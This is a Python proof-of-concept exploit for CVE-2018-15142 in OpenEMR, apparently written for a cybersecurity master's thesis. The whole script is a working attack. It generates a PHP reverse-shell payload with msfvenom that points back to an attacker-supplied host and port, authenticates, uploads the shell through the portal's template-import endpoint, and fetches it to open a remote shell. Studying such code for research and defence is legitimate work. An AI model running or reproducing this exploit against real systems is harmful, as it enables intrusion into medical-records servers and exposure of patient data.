# TFM: 
# Center: IMF Master Cybersecurity Deloitte Online 
# Author: M3str3 <namestre3@protonmail.com>
# CVE-CVE-2018-15142
# CVE Details: https://www.cvedetails.com/cve/CVE-2018-15142/

import requests
import os
import argparse

parser = argparse.ArgumentParser(description="Exploit RCE vulnerability in OpenEMR (CVE-2018-15142)")
parser.add_argument('-t','--target', required=True, help='Domain of the OpenEMR installation')
parser.add_argument('--ssl', action="store_true", help="Use http or https protocol")
parser.add_argument('--user', required=True, help='Username for authentication')
parser.add_argument('--password', required=True, help='Password for authentication')
parser.add_argument('--lhost', required=True, help='Reverse shell local host')
parser.add_argument('--lport', required=True, help='Reverse shell local port')
args = parser.parse_args()

def generate_reverse_shell(payload, shell_name):
    print(f"[*] Generating the reverse shell payload: {shell_name}")
    result = os.system(f"msfvenom -p {payload} LHOST={args.lhost} LPORT={args.lport} -f raw > {shell_name}")
    if result != 0:
        print("[!] Error generating the reverse shell payload")
        exit(1)

def authenticate(session):
    uri = f"{args.target}/interface/main/main_screen.php?auth=login&site=default"
    data = {
        'new_login_session_management': '1',
        'authProvider': 'Default',
        'authUser': args.user,
        'clearPass': args.password,
        'languageChoice': '1'
    }
    print('[*] Authenticating')
    response = session.post(uri, data=data)
    if "login_screen.php" in response.url:
        print("[!] Authentication failed. Check your credentials.")
        exit(1)
    print("[*] Authentication successful")

def upload_shell(session, shell_name, shell_path):
    data = {
        'site': 'default',
        'mode': 'save',
        'docid': shell_name,
        'content': open(shell_path, 'r').read()
    }
    uri = f"{args.target}/portal/import_template.php?site=default"
    print('[*] Uploading the reverse shell')
    response = session.post(uri, data=data)
    print(response.text)
    if response.status_code != 200:
        print("[!] Error uploading the reverse shell")
        exit(1)
    print("[*] Shell uploaded successfully")


def execute_shell(shell_name):
    uri = f"{args.target}/portal/{shell_name}"
    print(f"[*] Executing the reverse shell: {uri}")
    response = requests.get(uri)
    if response.status_code != 200:
        print("[!] Error executing the reverse shell")
        exit(1)
    print("[*] Reverse shell executed successfully")


if __name__ == '__main__':
    args.target = f"{'https' if args.ssl else 'http'}://{args.target}"
    
    print("="*60)
    print(" " * 10 + "Proof of Concept - CVE-2018-15142")
    print(" " * 10 + "IMF Master Cybersecurity Deloitte Online")
    print(" " * 10 + "Author: M3str3 <namestre3@protonmail.com>")
    print("="*60)

    session = requests.Session()
    shell_name = "tmp.php"
    shell_path = shell_name
    payload = 'php/reverse_php'
    

    generate_reverse_shell(payload, shell_name)
    authenticate(session)
    upload_shell(session, shell_name, shell_path)
    execute_shell(shell_name)
    
